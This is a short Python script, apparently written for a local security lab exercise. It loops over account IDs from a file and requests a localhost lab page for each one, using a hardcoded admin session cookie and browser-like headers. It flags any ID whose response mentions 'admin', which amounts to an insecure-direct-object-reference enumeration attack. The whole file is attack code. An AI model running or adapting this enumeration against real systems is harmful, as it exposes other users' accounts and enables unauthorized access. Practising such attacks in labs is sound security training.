```python
import requests

cookies = {
    'admin_cookie': '5ac5355b84894ede056ab81b324c4675',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=0, i',
}



id_list = open('id_list.txt', 'r').readlines()


for id_num in id_list:
    params = {'account': id_num,}
    response = requests.get(f'http://localhost/labs/e0x02.php', params=params, cookies=cookies, headers=headers)
    if 'admin' in response.text.lower():
        print(f"[+] Found Possible admin user with ID : {id_num}")
```